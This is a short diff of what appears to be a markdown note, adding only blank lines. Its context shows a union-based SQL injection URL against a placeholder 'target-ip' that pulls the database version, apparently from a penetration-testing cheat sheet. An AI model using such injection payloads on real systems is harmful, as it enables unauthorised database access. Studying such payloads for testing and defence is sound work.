@@ -17,3 +17,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 http://target-ip/inj.php?id=1 union all select 1,2,3,@@version,5
 
 ```
+
+
